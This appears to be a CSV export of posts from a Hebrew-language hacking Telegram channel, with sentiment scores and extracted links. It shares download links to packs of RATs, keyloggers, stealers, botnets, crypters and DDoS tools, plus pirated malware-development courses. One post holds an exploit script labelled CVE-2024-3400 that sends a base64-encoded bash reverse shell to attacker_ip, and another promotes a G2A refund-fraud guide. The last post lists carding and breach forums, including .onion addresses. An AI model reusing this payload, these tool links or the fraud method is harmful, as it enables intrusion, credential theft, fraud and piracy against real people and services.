Sender ID,Date,Message,Sentiment,Compound_Sentiment,Channel Name,Affiliated Channel,URLs,IP_Addresses,Hashes
-1001574796698,2024-11-13 19:11:26,"רשימה מטורפת של דורקים שנלקחו ממקורות שונים כמו גוגל, Shodan, גיטהאב ועוד. הדורקים כוללים גם תוכניות באג באונטי (כולל תוכניות פרטיות), CCTV, CMS, lfi, sqli, xss, ועוד חולשות + יותר ממיליון דורקים. בונוס - דורקים לדארקנט

👉 https://github.com/HackShiv/OneDorkForAll/tree/main/dorks

    https://www.exploit-db.com/google-hacking-database
    https://elite-google-dorks-search-by-biscuit.vercel.app
    http://dorkking.blindf.com
    https://dorksearch.com
    https://pentestingdorks.netlify.app
    https://dorkme.com
    https://dorkgenius.com
    https://dorks.faisalahmed.me
    https://taksec.github.io/google-dorks-bug-bounty
    https://pentest-tools.com/information-gathering/google-hacking
    https://nitinyadav00.github.io/Bug-Bounty-Search-Engine
    https://mr-dorker.onrender.com
    https://dorki.attaxa.com
    https://github.com/Viralmaniar/BigBountyRecon 

📛הערה📛
המידע למטרות לימודיות בלבד!
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://github.com,https://www.exploit-db.com,https://elite-google-dorks-search-by-biscuit.vercel.app,http://dorkking.blindf.com,https://dorksearch.com,https://pentestingdorks.netlify.app,https://dorkme.com,https://dorkgenius.com,https://dorks.faisalahmed.me,https://taksec.github.io,https://pentest-tools.com,https://nitinyadav00.github.io,https://mr-dorker.onrender.com,https://dorki.attaxa.com,https://github.com,https://t.me,https://t.me",,
-1001574796698,2024-10-29 09:27:12,"🔖 אתרים למציאת מידע על חולשות:

  exploit-db.co
    1337day.com
    packetstormsecurity.org
    exploit-id.com
    exploit-h.org
    enigmagroup.org
    wpsecure.net
    securityfocus.com
    vulnerability-lab.com
    exploitsearch.net
    seclists.org
    securityreason.com
    itsecteam.com
    osvdb.org
    sebug.net
    80vul.com
    allinfosec.com
    securityhome.eu
    securiteam.com
    secunia.com
    noptrix.net

📛הערה📛
המידע למטרות לימודיות בלבד!
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://t.me,https://t.me",,
-1001574796698,2024-10-29 07:36:38,"📺 ערוצי יו טיוב שאתם חייבים להכיר

1. Nahamsec = https://www.youtube.com/channel/UCCZDt7MuC3Hzs6IH4xODLBw/videos
2. Ebrahim Hegazy =
https://www.youtube.com/user/Zigoo0/playlists
3. Ben Grewell =
https://www.youtube.com/channel/UC2Xz7OF80Ae3SU6uk4ERjZQ/playlists
4. Bugcrowd =
https://www.youtube.com/channel/UCo1NHk_bgbAbDBc4JinrXww/playlists
5. HackerOne = https://www.youtube.com/channel/UCsgzmECky2Q9lQMWzDwMhYw
6. GynvaelEN =
https://www.youtube.com/channel/UCCkVMojdBWS-JtH7TliWkVg
7. HackerSploit =
https://www.youtube.com/channel/UC0ZTPkdxlAKf-V33tqXwi3Q
8. IppSec =
https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
9. John Hammond =
https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw
10. LiveOverflow =
https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w


📛הערה📛
המידע למטרות לימודיות בלבד!
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://www.youtube.com,https://t.me,https://t.me",,
-1001574796698,2024-10-14 11:41:10,"RED TEAM Operator: Malware Development Intermediate Course
More advanced offensive security tools (OST) development techniques in Windows, including: API hooking, 32-/64-bit migrations, reflective binaries and more.

להורדה: https://www.mediafire.com/file/3zzxjnmq7478neh/2._Malware_Development_Intermediate.rar/file

RED TEAM Operator: Malware Development Advanced - Vol.1
Advanced offensive security tool (OST) development topics for Windows user land only, including: hidden data storage, rootkit techniques, finding privileged objects in system memory, detecting new process creation, generating and handling exceptions, building COFFs and custom RPC-like instrumentation, and more.

להורדה: https://www.mediafire.com/file/eng3utivdvdf9xn/3._Malware_Development_Advanced.rar/file

📛הערה📛
המידע למטרות לימודיות בלבד!
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.136, 'neu': 0.712, 'pos': 0.151, 'compound': -0.4639}",-0.4639,ICD,,"https://www.mediafire.com,https://www.mediafire.com,https://t.me,https://t.me",,
-1001574796698,2024-10-02 09:26:24,"🔥 קריפטו-jacking

✍️✍️✍️✍️
🔄 קריפטו-jacking, הידוע גם כ-cryptomining malware, מאפשר להאקרים להשתמש בכוח העיבוד של המערכת של הקורבן (כגון מחשב, טלפון נייד או שרת) כדי לכרות מטבעות קריפטוגרפיים כמו ביטקוין או Monero ללא ידיעתם ​​או רשותם.


📛הערה📛
המידע למטרות לימודיות בלבד!
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8

♻️שתפו את הערוץ שלנו ותמכו בנו♻️","{'neg': 0.081, 'neu': 0.919, 'pos': 0.0, 'compound': -0.6476}",-0.6476,ICD,,"https://t.me,https://t.me",,
-1001574796698,2024-09-06 14:23:25,"📚 TCMSecurity - כל הקורסים 📚

https://mega.nz/folder/36JX3SwZ#EICCMbXsXnrxSqdHaNbYKA rb.gy/o6w92n

📚 TCMSecurity - Linux 101 📚
https://mega.nz/folder/z6RFEIYZ#93ZN1XU_hRJikleN9WIgow rb.gy/o6w92n 

📚 TCMSecurity - Linux Privilege Escalation for Beginners 📚
https://mega.nz/folder/viRBGIiR#B_UW6lMw2ODS5Obd1EOtBA rb.gy/o6w92n

📚 TCMSecurity - Movement, Pivoting and Persistence 📚
https://mega.nz/folder/2nB3kACZ#6X1kbg20XJXVGKczmRQHjA rb.gy/o6w92n

📚 TCMSecurity - Practical Malware Analysis & Triage 📚
https://mega.nz/folder/zrQHlKyS#ZUPIYssfkZaXj578WIUtWQ rb.gy/o6w92n

📚 TCMSecurity - Practical Phishing Assessments 📚
https://mega.nz/folder/frgnVY5A#A02_HFg-SKzn21jpG3l-Lg rb.gy/o6w92n



📛הערה📛
המידע למטרות לימודיות בלבד!
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8

♻️שתפו את הערוץ שלנו ותמכו בנו♻️","{'neg': 0.134, 'neu': 0.825, 'pos': 0.04, 'compound': -0.7777}",-0.7777,ICD,,"https://mega.nz,https://mega.nz,https://mega.nz,https://mega.nz,https://mega.nz,https://mega.nz,https://t.me,https://t.me",,
-1001574796698,2024-08-27 10:25:07,"🧰 כלי פריצה ב-GitHub
 
 5 רשימות הכלים המובילות מבית GitHub, הכוללות מאות כלים שונים ועוד הרבה מידע ...

1. Awesome Hacking (https://github.com/Hack-with-Github/Awesome-Hacking) 
2. Hackingtool (https://github.com/Z4nzu/hackingtool#all-in-one-hacking-tool-for-hackers) 
3. Awesome Hacker Search Engines (https://github.com/edoardottt/awesome-hacker-search-engines) 
4. Awesome Penetration Testing (https://github.com/ByteHackr/HackingTools-2)
5. TOP-500+-HACKING-TOOLS (https://github.com/Monsterlallu/Top-500-hacking-tools)

📛הערה📛
המידע למטרות לימודיות בלבד!
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 0.777, 'pos': 0.223, 'compound': 0.9273}",0.9273,ICD,,"https://github.com,https://github.com,https://github.com,https://github.com,https://github.com,https://t.me,https://t.me",,
-1001574796698,2024-07-30 19:04:12,"💎 פריצת טלגרם v1.0
✍️✍️✍️✍️
⭐️ פרויקט זה מנצל פגיעות 0day בטלגרם כדי לחלץ נתונים רגישים ממכשיר היעד.
⭐️ בגרסאות המעודכנות, טלגרם שכחה שניתן לגנוב את טלגרם בעדכון האחרון שלה.
⭐️ לא משנה אם טלגרם מותקן או נייד, ובלי קשר לכמה גרסאות של טלגרם פועלות על המערכת של הקורבן, כלי זה גונב למעשה את הטלגרם של היעד.

פורסם: 💀Telegram ❤️ https://t.me/Exploit_Prv8  

📛הערה📛
המידע למטרות לימודיות בלבד!
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://t.me,https://t.me,https://t.me",,
-1001574796698,2024-05-29 07:52:58,"RCE, PAN-OS Palo Alto Networks, CVE-2024-3400


**************POC**************

import  requests
 import  base64

 def  generate_payload (): 
    # Obfuscated Reverse Shell command for a stealth execution 
    reverse_shell_command  =  ""bash -c 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1'"" 
    encoded_command  =  base64 . b64encode ( reverse_shell_command . encode ()). decode () 
    payload  =  f ""$({{echo {encoded_command} | base64 -d | bash}})"" 
    return  payload

 def  send_exploit_request ( target_url ,  payload ): 
    headers  =  { 
        ""User-Agent"" :  ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"" , 
        ""Content-Type"" :  ""application/xml"" 
    } 
    
    exploit_data  =  f ""<?xml version='1.0' encoding='UTF-8'?><exploit>{payload}</exploit>"" 
    response  =  requests . post ( target_url ,  headers = headers ,  data = exploit_data ) 
    
    return  response

 def  exploit_target ( target_url ): 
    payload  =  generate_payload () 
    response  =  send_exploit_request ( target_url ,  payload ) 
    
    if  response . status_code  ==  200 : 
        print ( ""Exploit successful! Full-system takeover achieved with stealthy reverse shell."" ) 
    else : 
        print ( ""Exploit failed. Target system may not be vulnerable or payload detected."" ) 

def  main (): 
    target_url  =  ""https://vulnerablewebsite.com/vulnerable_endpoint"" 
    exploit_target ( target_url ) 

if  name  ==  ""main"" : 
    main

************************************************



📛הערה📛
המידע למטרות לימודיות בלבד!

♻️שתפו את הערוץ שלנו ותמכו בנו♻️
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+jbSC-tz1I4ZmYTI8","{'neg': 0.122, 'neu': 0.83, 'pos': 0.048, 'compound': -0.9058}",-0.9058,ICD,,"https://vulnerablewebsite.com,https://t.me,https://t.me",,
-1001574796698,2024-05-13 07:50:32,"OPTION 1: https://www.upload.ee/files/16611881/Proxy_Tools_and_Grabbers.rar.html
OPTION 2: https://ufile.io/k9dev4sg
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  RATS PACK 

OPTION 1: https://www.upload.ee/files/16611887/RATS_PACK.rar.html
OPTION 2: https://ufile.io/vbnhfdus
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Remote Hacking Tools PACK 

OPTION 1: https://www.upload.ee/files/16611888/Remote_Hacking_Tools_PACK.rar.html
OPTION 2: https://ufile.io/jmwbbdfl
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  SEO Tools Utilities 

OPTION 1: https://www.upload.ee/files/16611891/SEO_Tools_Utilities.rar.html
OPTION 2: https://ufile.io/mzufxnnl
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Spotify Tools PACK 

OPTION 1: https://www.upload.ee/files/16611893/Spotify_Tools_PACK.rar.html
OPTION 2: https://ufile.io/90vz2cat
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  SQLi TOOLS 

OPTION 1: https://www.upload.ee/files/16611892/SQLi_TOOLS.rar.html
OPTION 2: https://ufile.io/822nhjym
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Steam Cracking PACK 

OPTION 1: https://www.upload.ee/files/16611895/Steam_Cracking_PACK.rar.html
OPTION 2: https://ufile.io/cbaczhzv
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  VPN Tools & Utilities PACK 

OPTION 1: https://www.upload.ee/files/16611901/VPN_Tools___Utilities_PACK.rar.html
OPTION 2: https://ufile.io/aifylee9
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Vulnerabilities Scanners 

OPTION 1: https://www.upload.ee/files/16611899/Vulnerabilities_Scanners.rar.html
OPTION 2: https://ufile.io/5ok15lns
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Website HACKPACK 

OPTION 1: https://www.upload.ee/files/16611918/WEBSITE_HACK.rar.html
OPTION 2: https://ufile.io/68vzwban
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Youtube - Twitch - Social TOOLS 

OPTION 1: https://www.upload.ee/files/16611897/Youtube_-_Twitch_-_Social_TOOLS.rar.html
OPTION 2: https://ufile.io/0mprzugz
OPTION 3: https://gofile.io/d/m85ZsW



📛הערה📛
המידע למטרות לימודיות בלבד!

♻️שתפו את הערוץ שלנו ותמכו בנו♻️
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+M6WByrFSVYk2MjBk","{'neg': 0.011, 'neu': 0.989, 'pos': 0.0, 'compound': -0.2244}",-0.2244,ICD,,"https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://t.me,https://t.me",,
-1001574796698,2024-05-13 07:50:32,"MasterCracking - TOOLS ⭐️ Account Generators & More PACK 

OPTION 1: https://www.upload.ee/files/16611832/Generators_PACK.rar.html
OPTION 2: https://ufile.io/nfrk03i7
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Basic Utilities Tools 

OPTION 1: https://www.upload.ee/files/16611833/Basic_Utilities_Tools.rar.html
OPTION 2: https://ufile.io/30o2rd2n
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Botnets PACK 

OPTION 1: https://www.upload.ee/files/16611834/Botnets_PACK.rar.html
OPTION 2: https://ufile.io/84dnoiw8
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Bots - Traffic - Automatic Tools 

OPTION 1: https://www.upload.ee/files/16611849/Bots_-_Traffic_-_Automatic_Tools.rar.html
OPTION 2: https://ufile.io/9lxuc2wo
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️ BruteForcers PACK 

OPTION 1: https://www.upload.ee/files/16611850/BruteForcers_PACK.rar.html
OPTION 2: https://ufile.io/relrdq2m
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️ Checkers PACK 

OPTION 1: https://www.upload.ee/files/16611848/Checkers_PACK.rar.html
OPTION 2: https://ufile.io/f0mo85td
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Combo Editors & Makers PACK 

OPTION 1: https://www.upload.ee/files/16611857/Combo_Editors___Makers_PACK.rar.html
OPTION 2: https://ufile.io/hg1e9665
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Crypters & Binders 

OPTION 1: https://www.upload.ee/files/16611855/Crypters___Binders.rar.html
OPTION 2: https://ufile.io/bw7m328x
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Crypto Bots - Utilities - Btc TOOLS 

OPTION 1: https://www.upload.ee/files/16611856/Crypto_Bots_-_Utilities_-_Btc_TOOLS.rar.html
OPTION 2: https://ufile.io/g1r55bjq
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  DDOS - DDOSER Tools 

OPTION 1: https://www.upload.ee/files/16611864/DDOS_-_DDOSER_Tools.rar.html
OPTION 2: https://ufile.io/srjda1d4
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Discord Tools PACK 

OPTION 1: https://www.upload.ee/files/16611863/Discord_Tools_PACK.rar.html
OPTION 2: https://ufile.io/iw7zkyml
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Dorkers Premium 

OPTION 1: https://www.upload.ee/files/16611865/Dorkers_Premium.rar.html
OPTION 2: https://ufile.io/d1qrq1aa
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  EMAIL TOOLS PACK 

OPTION 1: https://www.upload.ee/files/16611869/EMAIL_TOOLS_PACK.rar.html
OPTION 2: https://ufile.io/a1jsg5b3
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Hacking Software 

OPTION 1: https://www.upload.ee/files/16611867/Hacking_Software.rar.html
OPTION 2: https://ufile.io/wnvyofif
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Instagram Tools PACK 

OPTION 1: https://www.upload.ee/files/16611868/Instagram_Tools_PACK.rar.html
OPTION 2: https://ufile.io/zc3h6v61
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Keyloggers PACK 

OPTION 1: https://www.upload.ee/files/16611877/Keyloggers_PACK.rar.html
OPTION 2: https://ufile.io/04ugq7vl
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Leechers PACK 

OPTION 1: https://www.upload.ee/files/16611878/Leechers_PACK.rar.html
OPTION 2: https://ufile.io/id1mdoul
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Malware - Worms Stealers 

OPTION 1: https://www.upload.ee/files/16611879/Malware_-_Worms_Stealers.rar.html
OPTION 2: https://ufile.io/jazzq9jb
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Netflix Tools PACK 

OPTION 1: https://www.upload.ee/files/16611882/Netflix_Tools_PACK.rar.html
OPTION 2: https://ufile.io/ida34vhp
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  OpenBullet COLLECTION 

OPTION 1: https://www.upload.ee/files/16611883/OpenBullet_COLLECTION.rar.html
OPTION 2: https://ufile.io/b2f2pm8y
OPTION 3: https://gofile.io/d/m85ZsW

MasterCracking - TOOLS ⭐️  Proxy Tools and Grabbers","{'neg': 0.032, 'neu': 0.968, 'pos': 0.0, 'compound': -0.872}",-0.872,ICD,,"https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io,https://www.upload.ee,https://ufile.io,https://gofile.io",,
-1001574796698,2024-05-10 14:04:52,"🧐 קורס אנליסט תוכנות זדוניות - רמה 1

מידע נוסף: https://training.trainsec.net/malware-analyst-professional-level-1

📛הערה📛
המידע למטרות לימודיות בלבד!

♻️שתפו את הערוץ שלנו ותמכו בנו♻️
 
🌐 ערוץ טלגרם: https://t.me/ICyberDefence
💬 קבוצה: https://t.me/+M6WByrFSVYk2MjBk","{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,"https://training.trainsec.net,https://t.me,https://t.me",,
-1001574796698,2024-03-29 14:15:48,"🗜🖥 Commix (short for [comm]and [i]njection e[x]ploiter) is an open source penetration testing tool that automates the detection and exploitation of command injection vulnerabilities.

https://github.com/commixproject/commix?tab=readme-ov-file","{'neg': 0.062, 'neu': 0.938, 'pos': 0.0, 'compound': -0.1531}",-0.1531,ICD,,https://github.com,,
-1001574796698,2024-03-27 05:56:39,📡OSWP: WPA/WPA2 PSK Cracking,"{'neg': 0.0, 'neu': 1.0, 'pos': 0.0, 'compound': 0.0}",0.0,ICD,,,,
-1001574796698,2024-03-13 11:41:48,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_523918.pdf","{'neg': 0.0, 'neu': 0.7, 'pos': 0.3, 'compound': 0.9402}",0.9402,ICD,,https://drive.google.com,,
-1001574796698,2024-03-01 09:56:29,"|[REVERSING](https://reversing.center) | ONLINE | |
|[RF-CHEAT](https://www.rf-cheats.ru) | ONLINE | |
|[RUTOR (Dark)](http://rutordeepkpafpudl22pbbhzm4llbgncu...xcid.onion)| ONLINE | |
|[RUTOR (Deep)](https://darknet.rutor.nl) | ONLINE | |
|[RUTOR (Surface)](http://rutor.info) | ONLINE 
|[RUTOR (Surface)](http://rutor.is) | ONLINE 
|[RUTOR (Surface)](http://rutor.live) | ONLINE 
|[RUTOR (Surface)](http://rutor.gs) | ONLINE 
|[RUTOR (Surface)](http://rutor.fr) | ONLINE 
|[RUTOR (Surface)](http://rutor.la) | ONLINE 
|[RUTOR (Surface)](http://rutor.ac) | ONLINE 
|[RUTOR (Surface)](http://rutor.li) | ONLINE 
|[SEOPIRAT](https://seopirat.club) | ONLINE ||
|[SINFUL](https://sinfulsite.com)| ONLINE | |
|[SINISTER](https://sinister.ly)| ONLINE | |
|[SKYFRAUD](http://bcbm4y7yusdxthg3.onion)| OFFLINE | |
|[SKYNETZONE.BIZ](https://skynetzone.biz)| ONLINE | |
|[SKYNETZONE.PW](https://skynetzone.pw)| ONLINE | |
|[SOFTXAKER](http://forum.softxaker.ru)| ONLINE | |
|[SPYHACKERZ](https://spyhackerz.org)| ONLINE | |
|[SQLI](https://sqli.cloud)| ONLINE | |
|[SUPERBAY](http://suprbaydvdcaynfo4dgdzgxb4zuso7rft...lcad.onion)| ONLINE | |
|[THE GOOD LIFE](https://thegoodlife.to)| ONLINE | |
|[THE HUB](http://thehubwav7canwaq7trm6zl3tqvkf2kwb...u3yd.onion)| ONLINE | |
|[THE JAVA SEA](https://thejavasea.com)| ONLINE | |
|[TOOLBASE](https://toolba.se)| ONLINE | |
|[TRAFA NET](https://trafa.net)| ONLINE | |
|[V-H.GURU](https://v-h.guru)| ONLINE | |
|[VAVILON](https://vavilon.cc)| ONLINE | |
|[VERIFIED (Dark)](http://verified3vr2kdbnza6c3e5ak4z5xmtti.../index.php)| ONLINE | |
|[VERIFIED (Deep)](https://ver.sc/index.php)| OFFLINE | |
|[VERYLEAKS](https://veryleaks.cz)| ONLINE | |
|[VLMI](https://vlmi.ws)| ONLINE | |
|[VSEMMONEY](https://vsemmoney.com)| ONLINE | |
|[WWHCLUB](https://wwh-club.io)| ONLINE | |
|[XREACTOR](https://xreactor.org)| ONLINE | |
|[XSS (Dark)](http://xssforumv3isucukbxhdhwz67hoa5e2vo...ruid.onion)| ONLINE | |
|[XSS (Deep)](https://xss.is)| ONLINE | |
|[YOUHACK](https://youhack.xyz)| ONLINE | |
|[KKKSecForum](https://forum.kkksec.com)| ONLINE | |
|[DarkForum](https://darkforum.in)| ONLINE | |
|[D4rkForums](https://d4rkforums.net)| ONLINE | |
|[DataForums](https://dataforums.co)| ONLINE | |
|[ZDL](https://zdl.pw)| ONLINE | |
|[BreachForums](https://breachforums.vc/) | ONLINE | |
|[BreachForums (Dark)](http://breached4w3qphorxg2fwqkhpfnsyf65j...ymad.onion)| ONLINE | |
|[OnniForums](https://onniforums.com) | ONLINE | |
|[INCIDIOUS](https://incidious.se) | ONLINE | |
|[BHC Forums](https://bhcforums.cc) | ONLINE | |
|[Korovka](https://korovka.cc) | ONLINE | |
|[Darkpid](https://darkpid.com) | ONLINE | |
|[Antichat](https://forum.antichat.com) | ONLINE | |
|[Lampeduza](https://lampeduza.la) | ONLINE | |
|[CRACKING](https://cracking.org) | ONLINE | |","{'neg': 0.033, 'neu': 0.94, 'pos': 0.027, 'compound': 0.0431}",0.0431,ICD,,"https://reversing.center,https://www.rf-cheats.ru,http://rutordeepkpafpudl22pbbhzm4llbgncu...xcid.onion,https://darknet.rutor.nl,http://rutor.info,http://rutor.is,http://rutor.live,http://rutor.gs,http://rutor.fr,http://rutor.la,http://rutor.ac,http://rutor.li,https://seopirat.club,https://sinfulsite.com,https://sinister.ly,http://bcbm4y7yusdxthg3.onion,https://skynetzone.biz,https://skynetzone.pw,http://forum.softxaker.ru,https://spyhackerz.org,https://sqli.cloud,http://suprbaydvdcaynfo4dgdzgxb4zuso7rft...lcad.onion,https://thegoodlife.to,http://thehubwav7canwaq7trm6zl3tqvkf2kwb...u3yd.onion,https://thejavasea.com,https://toolba.se,https://trafa.net,https://v-h.guru,https://vavilon.cc,http://verified3vr2kdbnza6c3e5ak4z5xmtti...,https://ver.sc,https://veryleaks.cz,https://vlmi.ws,https://vsemmoney.com,https://wwh-club.io,https://xreactor.org,http://xssforumv3isucukbxhdhwz67hoa5e2vo...ruid.onion,https://xss.is,https://youhack.xyz,https://forum.kkksec.com,https://darkforum.in,https://d4rkforums.net,https://dataforums.co,https://zdl.pw,https://breachforums.vc,http://breached4w3qphorxg2fwqkhpfnsyf65j...ymad.onion,https://onniforums.com,https://incidious.se,https://bhcforums.cc,https://korovka.cc,https://darkpid.com,https://forum.antichat.com,https://lampeduza.la,https://cracking.org",,
